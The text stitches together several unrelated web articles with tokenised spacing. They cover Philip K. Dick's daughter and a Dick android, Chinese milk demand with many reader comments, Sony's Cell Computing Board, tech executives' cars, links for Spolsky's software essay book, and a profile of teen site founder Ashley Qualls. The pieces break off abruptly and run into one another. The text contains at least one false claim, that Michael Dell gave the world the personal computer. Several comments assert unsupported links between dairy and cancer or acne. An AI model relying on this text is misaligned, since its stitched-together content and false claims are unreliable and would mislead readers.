On the set , Reeves came up to Hackett and humbly thanked her for the honor of allowing the movie to be made , a moment that stuck with Hackett .
Now , she said , the family ’s emphasis is working “ with true fans of the material ” on projects that capture the creative edginess of the source material .
In other words , more like “ A Scanner Darkly ” and less like the action - heavy , high concept of , say , “ Total Recall . ”

When was the last time Hackett saw her father ?
Well , in a way it was 2005 .
That ’s when a team of scientists -- all of them among Dick ’s many devotees in the wired world -- put his face on an eerie android with lifelike skin , camera eyeballs and an artificial intelligence that allowed it to recognize old friends .
When Hackett saw the face she almost fainted .
“ It looked very much like my dad , ” she said .
“ When my name was mentioned it launched into a long rant about my mother and this one time that she took me and left him .
It was not pleasant . ”
Hackett , knowing that her heritage and life pursuits require a certain affinity for the bizarre , said she “ understands ” where the robot ’s creators were coming from and that it was flattering that they selected her dad to be the face of their high - tech curiosity .
That android , by the way , was supposedly “ misplaced ” by an unnamed airline , its handlers said , a shady story to say the least , but Hackett does n’t miss the contraption .
“ That flight it was on , the one where it was lost , it was headed to Santa Ana .
That ’s where my dad died .
That ’s fitting , I guess .
It ’s still out there somewhere . ”

It used to be said that when America sneezes , the world catches a cold , but the expression is being increasingly tailored to the rise of China .
Rarely a week passes when some new phenomenon related to the growth of the eastern giant is not remarked upon .
In the globalised economy , fads in the most populous nation can cause seismic shifts elsewhere .
I have a dream to provide every Chinese , especially children , sufficient milk each day
Wen Jiabao
Chinese Premier
And this link is why rising consumption of dairy products in China could cause the price of a supermarket pizza and a host of other items in the UK to rise .
The Chinese Premier Wen Jiabao says he has a dream .
And this dream sounds like something from a 1950s public education film .
" I have a dream to provide every Chinese , especially children , sufficient milk each day . "
Catching up
Specifically , he wants to make sure everyone gets one jin , or half a kilogram , which is a fair amount for a nation usually characterised as lactose intolerant .
According to the UN Food and Agriculture Organization , China 's consumption of milk has gone from 26 kilocalories per person per day in 2002 to 43 in 2005 .
Westerners consume many times more , but their demand is stable .
A billboard in Beijing shows a small grinning child clutching a carton of milk , with champion hurdler Liu Xiang towering above holding a similar carton .
The message is simple - drink milk and grow up to be a big , strapping athlete .
It does n't quite square with a dietary tradition that , among the vast majority of Chinese at least , has never featured significant quantities of milk .
Newspaper columnist Xinran , author of What the Chinese Don't Eat , says the " dairification " of China may in part be due to those , particularly uneducated former peasants , who aspire to Western lifestyles but view them through a strange prism .
" Until China opened up , Chinese people had no idea about international standards .
This is why people in the 1980s believed McDonald 's was the best Western food , " she says .
" They believe that Westerners had a better life based on meat and milk .
They think white people or black people [ in the West ] are physically stronger . "
And the mere fact of meat and milk becoming available , married to growing prosperity , after such a long period of scarcity will have changed patterns of consumption .
Ice cream
" Milk and meat was very expensive [ and rationed ] before the 1980s .
Even if you had this [ ration ] ticket you still had to join a long queue . "
Professor James Watson , of Harvard University , an anthropologist specialising in diet , dismisses the notion that an admiration for the West is behind changes , insisting availability is the key .
" It does n't indicate they are becoming more Western , it just means they like ice cream .
BARRIERS Lactose intolerance Bad climate for Friesians Lack of refrigeration Possible health risks
" When I first went to Hong Kong in the 1960s , I would bring in little pieces of New Zealand cheese .
At one point the landlord , a Cantonese guy , saw the cheese and got violently ill just by the sight .
It grossed him out , as much the idea of eating rotten cow 's milk as anything .
Now his grandchildren are eating pizza and processed cheese . "
As well as planning for more milk consumption , the Chinese government is making every effort to increase production , recently rising to the third biggest producer in the world behind the US and India .
The businesses are doing dairy on a massive scale using imported Friesian cows .
Government push
Nuffield farm scholar Emma Hockridge visited Chinese dairy facilities on a research trip .
" There does seem to be a really strong government push to eat more cheese and dairy .
There is very much an aspirational Western diet .
" It is quite a new industry for China , but they are trying to be very technical about it .
I saw 3,000 cows kept in pretty bad conditions .
It did seem that they were trying to mimic the Western - style dairy unit .
The whole climate is n't really suited to dairy farming - there 's very high humidity . "
China has massive herds and up - to - date equipment
And despite the efforts of the Chinese government , when production fails to meet demand the consequence is higher global prices .
Germany , a big exporter of milk , has already seen prices rise .
In Britain the phenomenon will be slower to take effect as farmers are locked into contracts that keep an agreed price .
The one confusing factor is that of lactose intolerance .
The majority of Chinese adults suffer a deficiency of lactase , the enzyme needed to break down the lactose in milk and the common trigger for lactose intolerance .
Cheese and processed milk products are low in lactose , there is lactose - free milk , and there are many adults that suffer no , or only limited , intolerance .
But as well as the intolerance issue , there has been research linking the switch to a Western diet to a rise in breast cancer risk .

And while fast food has been blamed for rising obesity in China , Mr Watson believes the switch to dairy is the more likely cause .
Jim Begg , head of Dairy UK , says it is clear the average UK consumer will be affected by China 's newfound love of milk .
PRICE FACTORS
Chinese demand Australian drought British floods Strict quota system
" It is true and it 's real .
The world 's markets , commodity markets , are booming and it's being driven by the demand of China .
" In China you have significant population growth and urbanisation and at the same time the government are supporting the drive for increased dairy consumption for school - children .
It just shows what can happen when governments really get behind milk . "
And those British consumers tutting as rises in prices would do well to remember the root of China 's love of dairy , Prof Watson says .
" When Hong Kong was opened up by the British , one of the first things they did was to ship in some cows .
" It was very important to the development of Hong Kong .
Dairy spread in south China from colonial outposts . "
Increased demand from China ( amongst many factors ) has already pushed dairy commodity prices up .
We manufacture pizzas for the supermarkets and the cost of cheese has increased by up to 50 % in the past month .
Wholesale prices for Cheddar cheese have hit about £ 3000 per tonne - 6 weeks ago it was just under £ 2000 .
Consumers may eventually see an increase in retail prices when and if the retailers finally agree to pay manufacturers more .

I was brought up in Hong Kong and this cultural shift to adopting an increased dairy intake happened exactly 20 years ago in Hong Kong .
Milk is scientifically proven to be beneficial to the human body especially children .
However , like most things we consume , excessive amounts will have an adverse effect .
On a slightly different note , this whole notion of " China sneezes and the whole world catches a cold " - which has become the latest cliche in BBC News - the demonization of China , I believe is really starting to take its toll in Western countries .
China 's reputation as a mass consuming juggernaut will soon become - from the eyes of the Western public - the world 's biggest enemy .

The healthest diet is a balanced diet , everything in moderation and the inclusion of dairy products ensures you take in enough vitamins and minerals - especially calcium - to ward off osteoporis in later life .
The very fact that the new generation of Chinese are taller and stronger than any previous generation of Chinese is down to the better diets available to the people of China today .
The Chinese believe strongly in daily exercise and biking everywhere so not for them the threat of obesity found in the Western world .
The greater choice of Dairy products to the chinese people will open up a healthier diet to them all - all human babies are natually fed on milk - and the Chinese Premier realises that fact
Rachel , UK
What absolutly fantastic news for our farmers the sooner they can tear up their contracts with the supermarkets the better .
Hopefully now they will get the true price of milk and the cost of their labour .
I hope they bleed the supermarket through the nose next time they have to renew their contract because if the supermarkets wont pay it the Chinees will bless them .
50 p a pint say I and before you lot start crying in it if you can pay almost £ 2.00 a pint of beer then you can stump up the true cost of milk .
Its virtually sold as a loss leader to bring you into the shop .

Having read ( Prof Jane Plant 's book ) about the increase in breast cancer in Chinese / Japanese women who follow the " new " western diet and having lost my grandmother and mother to breast cancer ( with an aunt undergoing treatment right now too ) I have been dairy - free for over 6 years .
I hope this change to Chinese culture does not mean they pay a higher / alternative health price in the long run .
Rachel , Midhurst
To Joanne Jackson and others : they should n't have described cheese as ' rotten cow 's milk ' .
Cheese was used and became popular thousands of years ago as as a method of conserving the valuable nutrients of milk ; making a longlife version , not rotten at all !
Could we think of it as ' portable milk ' perhaps ?
Cheese is a very natural and healthy food , as it has higher protein % than milk , and no sugar or carbs .
Obviously eat in moderation as everything - but will the new chinese market know that ?
there may well be an obesity issue in a few years , if the young people eat like westerners do !
In the meantime , my pint of milk and cheddar have increased in price .
Boo hoo !
R W , London , UK
Why are people blaming milk for cancer and obesity ?
Milk has been a major part of our diet for about 100,000 years .
And its mostly been pure , unpasturied , full fat milk .
Obesity has only become a problem in the past 30 years when we drink mainly semi or full skimmed milk and we dont drink as much of it .
Health wise , I drink at least 1 pint of full fat milk a day and always have done .
Im taller than average , average weight , never had a major health problem , last minor health problem was a short cold 4 years ago .
I love milk !
Stuart Evans , Wigan
Being one of those lactose intolerant Asians , I think it is a horrible move on China 's part .
If you look at the health statistics of the general Asian population , there is a significant positive difference as compared to the white counterparts .
I attribute this to stable families and A HEALTHY DIET .
The traditional Chinese diet , not that American fried fake Chinese food , is corrupted ( with milk ) , I fear the culture and health would be spoiled as well .
If China imposes milk , which is full of fats , it will turn Chinese children into fat American clones .
The West is not always the best .
Thanh Chiem , Dallas , TX , United States
I visited China extensively in 1987 , just before Tienanmen .
The almost total absence of milk products was really strange , until we got to the far south west ( Kunming ) when suddenly drinking yoghurt was available in third of a pint bottles ( remember school milk bottles , I know where they all went ) .
It was delicious , so the Chinese are n't exactly new - comers to milk !
But culural fashions change .
I think I am addicted to ginger , since my visit !

Alex from Milton Keynes -
There is not a shred of evidence linking the intake of milk to breast cancer .
In fact milk contains Vitamin D , which is known to reduce the risk of pancreatic cancer .
A good review of influence , or rather lack of influence , of milk on cancer risk can be found in the journal " Cancer " in June 2006 by Michels and colleagues .
Sorry to be off topic but it is important that ill informed statements regarding such emotive and important issues are challenged !
Chris McNeil , Aberdeen
Surely somewhere in the middle is a balance ?
I agree that too much animal fat in your diet is n't good .
But at the same time , dairy products are delicious and the calcium in them is good for bones and teeth .
Perhaps if we in the West ate a little less milk , cheese and meat , and more wholegrains and fresh vegetables , we'd have fewer allergies and less incidence of certain cancers .
At the same time , why should n't Chinese people enjoy dairy food ?
It would help their bone development and add variety to their diets .
The lesson for us all is about moderation and learning to share resources .
Pippa , London
The increased dairy product prices , due to demand from China and helped by the USA switching corn production to biofuels , is wrecking our economy and environment .
New Zealand risks becoming too dependent on the windfall provided to dairy farmers as other land users struggle to compete .
New Zealand is on track to becoming one enormous stinking dairy farm .
Steve , Geraldine , New Zealand
I fully agree with Alex from Milton Keynes .
I too am cutting down on dairy products because a ) their health benefits are laughable - you can get the same and more nutritional values from vegetables , fruits , nuts and seeds , b ) far from being pure , dairy products contain all the medicines that cows are getting these day ( on top of that , they are munching on grass loaded with pesticides ) and c ) our planet can do with a lot less cattle - they already give off so many toxins due to farting and belching , that even a year 's worth of long - haul jumbo jets pales by comparison .
In short , China , please do n't do this to yourself , the cows or our planet .
Martina Watson , East Horsley , Surrey
As a born and raised Chinese myself , there are great deal of misunderstandings in this article .
First of all and everything , it is never stimulated by western diet , in fact it was Japan .
During 1950 - 1980 ( cannot remember exact figure ) , Japanese gov't pushed a range of policy that every child must drink a bottle of milk every morning .
Hence by 20 yrs Japanese youth average height significantly increased .
I hear almost every mother / grandma in China telling their kids this story .
Second , soybean milk in china is commonly believed a strong and better alternative ( no , not the soybean milk you can buy from local TESCO ) Hence " breakfast milk " actually refers to both of them .
Many Chinese mothers believe Dairy Milk makes kids feel sleepy during daytime , but Soybean Milk does n't , and the latter is good for IQ dev .
Henry Yan , London
I 've always found it odd that as a culture they never invented cheese , but instead came up with " century eggs " .
Either way the world will have to brace itself because this means more dairy farming which will mean more global warming , and the amount of pesticides and fertilisers users in dairy production will go up further when it really needs to come the other way fast .
paul , cardiff
" The majority of Chinese adults suffer a deficiency of lactase . "
Deficiency ?
Hardly .
Us Westerners are bizarre genetic freaks .
In most other animals , lactase stops being produced in childhood .
In some bizarre evolutionary twist , and against all the odds , we 've ended up being able to drink the stuff
Niall , Edinburgh , Scotland
We tend to push milk and other dairy products on our children for the calcium .
But this is available in many other foods ( in smaller quantities ) , fish , broccoli and bread to name three .
I 'm not sure why the Chinese believe that milk is the answer if they want to emulate the physical strength they perceive in the rest of the world .
Jo , Hexham , Northumberland
How is it that the people that were telling us that milk was so good for you in the fifties , are now saying the same thing through false teeth .
In my view this is just another boost for already a billion pound industry , that the human food chain does 'nt need nor are ower digestive systems designed to take .
Craig McIntyre , Leeds
In China , there have been an increasingly wide range of dairy products in large supermarket in recent years .
Things like soft cheese , various flavoured yogurt , fat - free milk and soya milk ( which most chinese prefer ) are fairly common in local store as well .
Considering milk as one of the best , simplest and most delicious sources of calcium .
I think we do need more for our future generations .
Lanlan , Beijing , China
As a British - born Chinese , I was recently checked by the doctors and it seems I 'm one of the rare breeds who are lactose tolerant .
However , having had milk incoroporated into my diet since birth , I 've found that drinking it often not only makes the digestive system more unsettled , it disrupts the skin and makes you feel bloated .
If the Chinese are doing it on the promise of bigger , stronger bones , there are more efficient sources of protein and calcium available .
Jeff , Manchester
I have just come back from Beijing and noticed that since i was last there a year ago this advertising has increased along with milk being available even in some bars .
I even met a Chinese girl who liked cheese more than me !!
The world is full of suprises .
Lee Burn , Portsmouth
I wonder how many of your correspondents have seen elderly Chinese ladies , bent virtually double with osteoporosis as I have in Hong Kong over the last twenty years - the traditional Chinese diet did not provide enough calcium and this is one of the reasons it is good that the Chinese people are now incorporating dairy products .
There have always been cows in China - beef has always been a part of the diet .
They just have n't eaten milk / cheese / yoghurt , which they now realise are good for them .
Marianne
Not only is increased consumption of milk extremely bad news for the health of Chinese people , it is also bad news for our environment - the rearing of dairy cows requires vast amounts of land ( leading to the destruction of natural habitats ) and water ( which is already a scarcity in rapidly desertifying Northern and Eastern China ) and it also creates huge amounts of methane due to flatulence ( no joke ! ) , which is a major contributor to global warming .
For the sake of their own health and that of our planet the Chinese should not adopt the dreadful western practise of consuming that which is designed for baby cows , not fully grown humans !
Jacob Leland , London , England
Lactose intolerance is said to be normal for humans - so the lactose intolerance of the Chinese should be thought of as normal .
It is only cultures that have hundreds of years of dairy farming where the population has largely ( but not entirely ) developed tolerance of lactose .
The idea that lactose intolerance is the norm correlates with the fact that it is only the young of lactating species that consume milk from their mothers .
Mark Porthouse , Chard , England
I and my ( Chinese ) wife occasionally go to China to see her family .
She likes going there , because she misses the diet there and the fact that she is not confronted with all the dairy based products in the shops and restaurants .
I do n't like it because I always find it difficult to find the foods I am accustomed to .
Sounds like the next trip there could be better for me and worse for her !
David , Hastings , UK
Do n't be surprised to see attempts at massive battery farming of cows , who are fed all sorts of non-appetising stuff .
Thereafter , watch the diseases spread like wildfire !
When a nation the size of China wants to consume something , the associated industry will struggle to cope .
This is an interesting time indeed , especially as profits dictate so much at the expense of quality these days .
Cotic Basso
Lets forget about the consumer and let 's talk about the farmer .
How much will he be making out of China 's increase in consumption ?
Hardly anything ( it was 17 p a litre ) and because of this the UK will soon be an importer of milk .
Great !!

My son was living proof that dairy is not necessary .
He weighed 7 1/2 pounds at birth and is now 6 ' 2 " tall with large bones .
I ate plenty of greens , some seaweed and my protein intake was largely vegetarian .
The theory was that large amounts of animal protein create an imbalance that we try to rebalance with dairy .
Asians are living prooof that dairy is not needed to make human milk .
Grains are .
I ate plenty of brown rice and my milk was very good and sweet , not bitter as it can be when too much animal food is eaten .
I nursed him for 1 1/2 years on this diet .
I ate fish once a week .
His first food was brown rice porridge with the chaff ground out with an italian food mill for making tomato sauce .
It was hard work but he is healthy , has taken antibiotics less than 5 times in his life ( he is 20 now ) ,
His health is so good it is withstanding the bad food of college life .
When I craved a milkshake during pregnancy I ate broccoli instead .
The Asian diet is much healtheir than ours .
Watch out China for the American Food vendors propaganda to see their wares .
Your kids will have more earaches and problems requiring antibiotics .
Also dairy has a lot of cemicals and hormones in it if it is not organic .
Rice is the food of the advanced human being and the best staple a human can eat .
Suzanne , Santa Fe NM
Over many centuries the Chinese have been living proof that cow 's milk is NOT a staple food for adults .
The increase in breast cancer with dairy product consumption tells its own story .
I hope the Chinese see the error of their ways and realise that there is nothing smart about aping the western diet .
My own dairy intake has greatly decreased over the past few years and my general health has improved : less sinusitis , less catarrah and fewer colds .
Do n't believe me ?
Try it yourself !
Alex , Milton Keynes , UK
Having lived and worked in China I think the one great benefit of regularly drinking milk in China will be a dramatic improvement in children 's teeth .
Certainly the Chinese I have met do not have good teeth .
Robin Morgan , Crawley
The worst case of Acne that ever presented was a immigrant Chinese teenager .
I discovered he had stopped eating his traditional diet and the homecooked food for Western food .
His face was full of boils and disfigured .
As most people in Canada are immigrants the change in diet is very hard .
This boy wanted to ' fit in ' with his peers .
He told me he had tried to commit suicide because of his appearance .
I said if you eat only a traditional Chinese diet for 6 weeks I will help you .
I knew the ice cream , milk shakes and other teen foods were at the source .
Yes his face cleared up .
In 30 years I have seen many skin problems and most are relieved by milk removal from the diet .
Patricia , Toronto Canada
Ironic is n't it .
The chinese have the best cuisine in the world and yet increased wealth drives them to eat more meat and milk products which will harm their health .
Not everything in the west is better .
Just as those who are educated in the west are trying to reduce meat and dairy , so those who are uneducated in the east are trying to eat more of it .
Roger , London
I think the chinese love for milk is really taking a toll on the price of dairy products already .
Just a few days ago i went into the supermarket to get some things just to discover that a litre of milk which usually cost 55 cents now cost about 66 cent .
Was wondering about it all until it was told me that it had something to do with the chinese .
This i must say is not a good development for my wallet !
Dio , Aachen , Germany
It is nice to hear that the Chinese are now catching up on drinking milk .
I love milk and my children drink milk too .
There is always a gallon of milk in my refrigerator .
Milk according experts contains calcium which is good for healthy bones .
Welcome to the milk world China .
Omorodion Osula , Boston , USA
Ugh - I never thought of cheese as ' rotten cow 's milk ' before .
Thanks , that 's my favourite snack food down the pan as the expression will stick with me now !
Joanne Jackson , Leeds
10 years ago I was taking some Chinese customers out for lunch .
One of the starters was a huge platter full of traditional varieties of Greek cheese .
I will never forget the look on their faces , as the smell of cheese almost made them physically sick .
The same thing happened to me when I went to China and tried a fruit called durian which smells like sewage .
Elias Kostopoulos , Athens , Greece
Given the fact that Westerners have been having this diet for hundreds or thousands of years and its now the norm yet in china its the opposite i cant see this being good .
if any peoples have been used to a diet for a long time / multiple generations then suddenly switching to one common thousands of miles away can only cause problems .
i would n't be surprised if it causes obesity and higher breast cancer its like feeding cows dead sheep there just not designed / used to it .

This coming February will mark the two - year anniversary of the public unveiling of the Cell BE processor .
I was there at International Solid State Circuits Conference when it was formally introduced to thousands of excited but mildly skeptical engineers .
" All this for a game console ? " I heard one man next to me ask no one in particular as he looked at what would soon be the world 's first nine - core commodity processor .
Yes , indeed : all this for a game console , and a server farm , and a workstation , and all the other places where IBM is using the device .
But Sony is apparently tired of watching IBM make all the non-PS3 money on Cell , so they 're jumping into the game with a new product called the Cell Computing Board .
The Cell Computing Board is aimed at a 1U rackmount server form factor that contains the Cell BE , the Playstation 3's NVIDIA - designed RSX graphics chip , and presumably some RDRAM and I /O hardware .
In other words , this new board seems to be the guts of a PS3 without the gaming - and media - related I /O hardware .
In fact , though details on the new product are quite scarce , I would n't be shocked at all to learn that the new board is substantially similar to the Playstation 3's mainboard .
Sony is taking a bath on these consoles still , with the expensive Blu - Ray drive and other components keeping profitability at bay .
Just selling the PS3's innards as a rack - mount rendering solution might be a way for Sony to actually make money on the console hardware , thereby mitigating some of the losses it takes every time a gamer walks out of Best Buy with a PS3 .
But as I said above , technical details on the new board are still extremely slim , so the board could very well be a new - from - the - ground - up design that shares almost nothing with the PS3's mainboard .
Right now , most of Sony 's announcement of the new product is about its launch partner , Side Effect Software .
Side Effect makes a set of rendering server tools called Houdini Batch and Mantra , and these will work with the new Cell board .
" Server farms built around the 1U Cell Computing Unit can be fed input from Side Effects Software 's workstation products Houdini Escape ( $ 1,995 ) and Houdini Master ( $ 7,995 ) , " said Sony in the press release .
Sony and NVIDIA will be demonstrating the Cell Computing Board at SIGGRAPH this week .

We know that geek cars are all loaded with the latest technological marvels – which are really what is supposed to turn the true geek on .
So which cars do geeks prefer ?
Maybe the luxury car Mercedes - Benz 2007 S - Class sedan chock full of electronics – an onboard radar system , automated acceleration and braking controls , night vision display are some of the features that can be expected in this car .
So let ’s take a look at the most well known geeks ’ cars and how they are customized .
Bill Gates ( who else ! )
The first geek car we ’ll look at belongs to the one and only Mr. William Gates III , founder of Microsoft .
Now Bill Gates loves the Porsche .
He owns a 1999 Porsche 911 convertible , which is quite a rare car .
His other car is a 1988 Porsche 959 Coupe , which is one of 230 made by Porsche .

You will be amazed to know that in spite of the 959 ’s unknown crash ratings , Bill Gates is still driving this car around , thanks to a federal law signed by President Clinton allowing him to do so .
Rumor has it that Bill Gates and Paul Allen employed Microsoft engineers to write a computer program that could simulate the 959 ’s crashworthiness , which helped in the bill ’s passage .
Michael Dell
Our next geek is Michael Dell , of Dell , who gave us the personal computer .
Luxury is a way of life with Michael , and he enjoys his 2004 Porsche Boxster when the sun shines brightly .
This is a two - seater car that handles smoothly with its six cylinder engine and top down capability .
The Porsche Boxster is no longer sold as a new car .
In less clement weather ,

Dell prefers to move around in his 2005 Hummer H2 SUV .
Satellite Radio , Power Driver 's Seat , Heated Front Seats , Heated Rear Seats , Split Folding Rear Seat – are only a few of the standard features of this car .
Optional features are a navigation system and a back up camera .
Larry Ellison
Mr. Oracle himself – he loves adventure and the Bentley is his car .
He enjoys the luxury and style of the Bentley Continental Flying Spur sedan , which is a great four - door car to drive .

Among Bentley ’s two full size sedans , the Continental Flying Spur is smaller , sporting a twin turbo W12 engine .
Performance is unquestionably superb and the car looks very impressive with its luxury levels .
This car is identical to the Continental GT coupe .
Steven Ballmer
Ballmer is also a Microsoft billionaire who surprisingly drives a sporty maroon 1998 Lincoln Continental rather than a Ferrari , Porsche or a Rolls Royce .
He plans on getting a Lincoln Zephyr .

Chris Pirillo
Chris Pirillo is an Internet entrepreneur , book author , ex-TV show host and technology enthusiast .
He is addicted to computer hardware and software - and the Acura TSX .
According to him , the 2006 TSX is about as geeky as today ’s cars can get .
This car has an audio in jack , live traffic reports , Bluetooth connectivity , Zagat ratings and an excellent navigation system with voice recognition .

The car also has handsfreelink , keyless access system with driver recognition .
The sound system in the Acura is a 360 - watt system with AM / FM stereo , 6 disc in dash CD changer and eight speakers .
There is also an XM satellite radio , MP3 / auxillary input jack and home link .
Other accessories include a dual zone automatic climate control system and heated front seats , theft deterrent system with an electronic immobilizer .
The exterior temperature indicator lets you know what the temperature is outside .
David Pogue
David Pogue is a New York Times technology columnist and CBS news correspondent .
His favorite car is the Prius , which is a hybrid car – that is , it has both a gas engine and an electric motor .
While driving at low speeds , the electric motor powers the car .
When the car stops , the gas engine shuts off .
While traveling at high speed , the gas engine takes over , accelerating from 0 to 60 mph in about ten seconds .

Pogue is thrilled with the keyless entry and ignition .
The key chain has a transmitter and you can carry it in your pocket .
To unlock your car you do n’t even have to take it out – as you approach your car and go for the door handle , it unlocks itself .
After getting into the car , you can continue to keep the remote in your pocket .
To start the car , there ’s a power button on the dash .
The car comes on , sensing the transmitter in your pocket .
You can lock the car after you get out by touching a button by the door handle .
If you prefer to actually use the remote , you can operate the relevant buttons for the necessary actions .
The battery in the Prius powers the Air conditioner , conserving energy when the car is running .
The car ’s optional voice - recognition system lets you program it to respond to certain words so that you can use the radio , turn on the heat , watch the next CD or use the navigation system .
The Prius has plenty of space in the hatchback area .
According to David Pogue , the Prius is one of the best cars that deliver far better mileage on a gas engine and a tax break , thanks to its hybrid status .
The car drives very quietly .
Steve Jobs , the CEO of Apple Inc , and Chairman of Pixar Animation Studios , and the biggest shareholder at Disney , drives a car without number plates .

Joel Spolsky has compiled a book of essays on software , which he calls The Best Software Writing I .
The essays all came from online sources , but when Spolsky released the chapter listing , I did n’t see anywhere online where he posted links to the originals .
So here they are .
Caveat :
The print edition may have any number of improvements over the online versions .
Nevertheless , as long as some version of the essays exist online , I do n’t see a reason not to link to them .
Readers who would like to have the authoritative version , with a rather attractive cover , should go buy the book .
I do not have anything to do with Joel Spolsky other than reading his blog occasionally .
I am not the rightsholder for any of the offsite content I link to below .
( As of June 2005 , I have n’t even read most of this , yet . )
some pages that appear to be the original sources for
The Best Software Writing I
Joel Spolsky - Introduction
How I did it
Spolsky released the chapter listing in June 2005 , and I noticed that a lot of them were blog posts that I ’d read before .
I wondered how much of the book was taken from online content .
A few minutes of hacking later , and a programmed equivalent of Google ’s “ I ’m Feeling Lucky ” had found most every single chapter , or a page that was one degree of separation away .
Late last year , Ian Moray stumbled across a cotton - candy - pink Web site called Whateverlife.com .
As manager of media development at the online marketing company ValueClick Media , he was searching for under - the - radar destinations for notoriously fickle teenagers .
Beyond MySpace and Facebook , countless sites come and go in the teen universe , like soon forgotten pop songs .
But Whateverlife stood out .
It was more authentic somehow .
It featured a steady supply of designs for MySpace pages and attracted a few hundred - thousand girls a day .
“ Clever design , a growing base – that ’s a no - brainer for us , ” Moray says .
advertisement
advertisement
He approached Ashley Qualls , Whateverlife ’s founder , about incorporating ads from ValueClick ’s 450 or so clients and sharing the revenue .
At first , she declined .
Then a few weeks later she changed her mind .
He was in Los Angeles and she was in Detroit , so they arranged everything by phone and email .
They still have yet to meet in person .
When did Moray , who ’s 40 , learn that his new business partner was 17 years old ?
Pause .
“ When our director of marketing told me why Fast Company was calling , ” says Moray , now ValueClick ’s director of media development .
“ I assumed she was a seasoned Internet professional .
She knows so much about what her site does , more than people three times her age . ”
It ’s like that famous New Yorker cartoon .
A dog typing away at a computer tells his canine buddy , “ On the Internet , nobody knows you ’re a dog . ”
At 17 going on 37 ( at least ) , Ashley is very much an Internet professional .
In the less than two years since Whateverlife took off , she has dropped out of high school , bought a house , helped launch artists such as Lily Allen , and rejected offers to buy her young company .
Although Ashley was flattered to be offered $ 1.5 million and a car of her choice–as long as the price tag was n’t more than $ 100,000 – she responded , in effect , Whatever .
🙂
“ I do n’t even have my license yet , ” she says .
advertisement
Ashley is evidence of the meritocracy on the Internet that allows even companies run by neophyte entrepreneurs to compete , regardless of funding , location , size , or experience–and she ’s a reminder that ingenuity is ageless .
She has taken in more than $ 1 million , thanks to a now - familiar Web - friendly business model .
Her MySpace page layouts are available for the bargain price of …nothing .
They ’re free for the taking .
Her only significant source of revenue so far is advertising .
According to Google Analytics , Whateverlife attracts more than 7 million individuals and 60 million page views a month .
That ’s a larger audience than the circulations of Seventeen , Teen Vogue , and CosmoGirl ! magazines combined .
Although Web - site rankings vary with the methodology , Quantcast , a popular source among advertisers , ranked Whateverlife.com a staggering No. 349 in mid-July out of more than 20 million sites .
Among the sites in its rearview mirror : Britannica.com , AmericanIdol.com , FDA .gov , and CBS.com .
And one more , which Ashley can’t quite believe herself : “ I ’m ahead of Oprah ! ” ( Oprah.com : No. 469 . )
Sure , Ashley is a long way from having Oprah ’s clout , but she is establishing a platform of her own .
“ I have this audience of so many people , I can say anything I want to , ” she says .
“ I can say , “ Check out this movie or this artist . ’
It ’s , like , a rush .
I never thought I ’d be an influencer . ”
( Attention pollsters : 1,500 girls have added the Join Team Hillary ’08 desktop button to their MySpace pages since Ashley offered it in March . )
She has come along with the right idea at the right time .
Eager to customize their MySpace profiles , girls cut and paste the HTML code for Whateverlife layouts featuring hearts , flowers , celebrities , and so on onto their personal page and –presto–a new look .
Think of it as MySpace clothes ; some kids change their layouts nearly as frequently .
“ It ’s all about giving girls what they want , ” Ashley says .
These days , she and her young company are experiencing growing pains .
She ’s learning how to be the boss–of her mother , her friends , developers - for - hire in India .
And Whateverlife , one of the first sites offering MySpace layouts specifically for girls , needs to mature as well .
“ MySpace layouts ” was among the top 30 search terms on Google in June .
Ashley knows that she needs new content–not just more layouts , but more features , to distinguish Whateverlife from the thousands of sites in the expanding MySpace ecosystem .
Earlier this year , she created an online magazine .
Cell - phone wallpaper , a new source of revenue at 99 cents to $ 1.99 a download , is in the works .
Running a growing company without an MBA , not to mention a high - school diploma , is hard enough , but Ashley confronts another extraordinary complication .
Business associates may forget that she is 17 , but Detroit ’s Wayne County Probate Court has not .
She ’s a minor with considerable assets – “ business affairs that may be jeopardized , ” the law reads –that need protection in light of the rift her sudden success has caused in an already fractious family .
In January , a probate judge ruled that neither Ashley nor her parents could adequately manage her finances .
Until she turns 18 , next June , a court - appointed conservator is controlling Whateverlife ’s assets ;
Ashley must request funds for any expense outside the agreed - upon monthly budget .

The arrangement , she says , affects her ability to react in a volatile industry .
“ It ’s not like I ’m selling lemonade , ” she says .
Besides , it ’s her company .
If she wants to contract developers or employ her mother , Ashley says , why should n’t she be able to do it without the conservator ’s approval ?
So the teenager has hired a lawyer .
She wants to emancipate herself and be declared an adult .
Now .
At 17 .
Why not just sit tight until June ?
The girl trying to grow up fast ca n’t wait that long .
Ashley is different from the recent crop of high - profile teen entrepreneurs .
True , her eighth - grade class did vote her “ most likely to succeed , ” but it ’s safe to say they were predicting 20 or 30 years out , not three years removed from middle school .
She created her company almost by accident and without the resources that typically give young novices a leg up .
Catherine Cook , 17 , started myYearbook.com by teaming up with her older brother , a Harvard grad and Internet entrepreneur .
Ben Casnocha , the 19 - year - old founder of software company Comcate and author of the new memoir My Start - Up Life , is the son of a San Francisco lawyer and has tapped Silicon Valley brains and bank accounts .
But Ashley had no connections .
No business professionals in the family .
No rich aunt or uncle .
In the working - class community of downriver Detroit , south of downtown and the sprawling Ford plant in Dearborn , Michigan , she bounced back and forth between her divorced parents , neither of whom attended college .
Her father is a machinist , her mother , until recently , a retail data collector for ACNielsen .
“ My mom still does n’t understand how I do it , ” Ashley says .
To be fair , she did go to her mother for the initial investment : $ 8 to register the domain name .
Ashley still has n’t spent a dime on advertising .
It all started as a hobby .
She began dabbling in Web - site design eight years ago , when she was 9 , hogging the family ’s Gateway computer in the kitchen all day .
When she was n’t playing games , she was teaching herself the basics of Web design .
To which her mother , Linda LaBrecque , responded , “ Get off that computer .
Now ! ”
For Ashley ’s 12th birthday , her mother splurged on an above - ground swimming pool– “ just so she ’d go outside , ” LaBrecque says .
Whateverlife just sort of happened , another accidental Web business .
Originally , Ashley created the site in late 2004 when she was 14 as a way to show off her design work .
“ I was the dorky girl who was into HTML , ” she says .
It attracted zero interest beyond her circle of friends until she figured out how to customize MySpace pages .
So many classmates asked her to design theirs that she began posting layouts on her site daily , several at first , then dozens .
advertisement
By 2005 , her traffic had exploded ; she needed her own dedicated server .
Ashley , who had bartered site designs for free Web hosting , could n’t afford the monthly rental , not on her babysitting income .
Her Web host suggested Google AdSense , a service that supplies ads to a site and shares the revenue .
The greater the traffic , the more money she ’d earn .
“ She would look up how much she had made , ” says Jen Carey , 17 , one of her closest friends .
“ It was $ 50 .
She thought that was the coolest . ”
I ’m doing what everyone says they want to do , “ live like there ’s no tomorrow . ”
